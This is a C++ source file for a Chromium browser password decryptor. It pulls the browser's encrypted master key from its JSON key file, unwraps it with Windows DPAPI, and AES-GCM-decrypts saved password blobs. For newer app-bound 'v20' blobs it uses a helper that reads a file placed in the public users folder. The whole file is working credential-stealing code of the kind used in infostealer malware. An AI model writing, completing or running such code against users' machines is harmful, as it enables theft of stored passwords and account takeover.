#include "includes\ChromiumDecryptor.h"
#include "includes\AppBoundDecryptor.h"

DATA_BLOB* master_key_blob;


ChromiumDecryptor::ChromiumDecryptor() {}
ChromiumDecryptor::~ChromiumDecryptor() {

	if (master_key_blob != nullptr) {
		LocalFree(master_key_blob->pbData);
		delete master_key_blob;
	}
}

bool ChromiumDecryptor::ChromiumDecryptorInit(std::string path)
{
	std::string key_base64 = get_browser_key(path);
	if (key_base64 == "")
	{
		return false;
	}

	master_key_blob = UnportectMasterKey(key_base64);
	if (master_key_blob != nullptr)
	{

		return true;
	}

	return false;
}

std::string ChromiumDecryptor::get_browser_key(std::string path)
{
	std::string enc_key_base64;

	enc_key_base64 = read_json(path);
	if (!enc_key_base64.empty())
	{

		return enc_key_base64;
	}
	return "";
}

DATA_BLOB* ChromiumDecryptor::UnportectMasterKey(std::string MasterString)
{
	std::vector<unsigned char> binaryKey;
	DWORD binaryKeySize = 0;


	if (!CryptStringToBinaryA(MasterString.c_str(), 0, CRYPT_STRING_BASE64, NULL, &binaryKeySize, NULL, NULL))
	{
		std::cout << "CryptStringToBinaryA [1] : Failed to convert BASE64 private key. \n";
		return nullptr;
	}

	binaryKey.resize(binaryKeySize);
	if (!CryptStringToBinaryA(MasterString.c_str(), 0, CRYPT_STRING_BASE64, binaryKey.data(), &binaryKeySize, NULL, NULL))
	{
		std::cout << "CryptStringToBinaryA [2] : Failed to convert BASE64 private key. \n";
		return nullptr;
	}


	DATA_BLOB in;
	DATA_BLOB* out = new DATA_BLOB;
	in.pbData = binaryKey.data() + 5;
	in.cbData = binaryKeySize - 5;

	if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, out))
	{
		std::cout << "CryptUnprotectData [1] : Failed to convert BASE64 private key. \n";
		return nullptr;
	}
	return out;
}

std::string ChromiumDecryptor::AESDecrypter(std::vector<BYTE> EncryptedBlob, std::string identifier)
{
	try
	{
		BCRYPT_ALG_HANDLE hAlgorithm = 0;
		BCRYPT_KEY_HANDLE hKey = 0;
		NTSTATUS status = 0;
		SIZE_T EncryptedBlobSize = EncryptedBlob.size();
		SIZE_T TagOffset = EncryptedBlobSize - 15;
		ULONG PlainTextSize = 0;

		std::vector<BYTE> CipherPass(EncryptedBlobSize);
		std::vector<BYTE> PlainText;
		std::vector<BYTE> IV(IV_SIZE);

		std::string meta(EncryptedBlob.begin(), EncryptedBlob.begin() + 3);


		if (meta == "v20")
		{


			std::string service_data_path = "c:\\users";
			service_data_path += "\\public\\";
			service_data_path += "NTUSER.dat";

			AppBoundDecryptor obj;
			if (obj.AppBoundDecryptorInit(service_data_path, identifier))
			{
				std::string decrypted_passwords = obj.AESDecrypter(EncryptedBlob);
				return decrypted_passwords;
			}
			return "";
		}


		std::copy(EncryptedBlob.data() + 3, EncryptedBlob.data() + 3 + IV_SIZE, IV.begin());
		std::copy(EncryptedBlob.data() + 15, EncryptedBlob.data() + EncryptedBlobSize, CipherPass.begin());


		status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
		if (!BCRYPT_SUCCESS(status))
		{

			return "";
		}


		status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
		if (!BCRYPT_SUCCESS(status))
		{

			BCryptCloseAlgorithmProvider(hAlgorithm, 0);
			return "";
		}


		status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, master_key_blob->pbData, master_key_blob->cbData, 0);
		if (!BCRYPT_SUCCESS(status))
		{

			BCryptCloseAlgorithmProvider(hAlgorithm, 0);
			return "";
		}


		BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO AuthInfo;
		BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
		TagOffset = TagOffset - 16;
		AuthInfo.pbNonce = IV.data();
		AuthInfo.cbNonce = IV_SIZE;
		AuthInfo.pbTag = CipherPass.data() + TagOffset;
		AuthInfo.cbTag = TAG_SIZE;


		status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, NULL, NULL, &PlainTextSize, 0);
		if (!BCRYPT_SUCCESS(status))
		{

			return "";
		}


		PlainText.resize(PlainTextSize);

		status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, PlainText.data(), PlainTextSize, &PlainTextSize, 0);
		if (!BCRYPT_SUCCESS(status))
		{

			return "";
		}


		BCryptCloseAlgorithmProvider(hAlgorithm, 0);

		return std::string(PlainText.begin(), PlainText.end());
	}
	catch (int e)
	{
		return "";
	}
}

std::string ChromiumDecryptor::read_json(const std::string& filePath) {
	std::ifstream file(filePath);
	if (!file.is_open()) {
		std::cerr << "Failed to open the file: " << filePath << std::endl;
		return "";
	}

	std::regex pattern("\"encrypted_key\"\\s*:\\s*\"([^\"]*)\"");
	std::string line;
	std::smatch match;

	while (std::getline(file, line)) {
		if (std::regex_search(line, match, pattern)) {
			return match[1];
		}
	}


	return "";
}
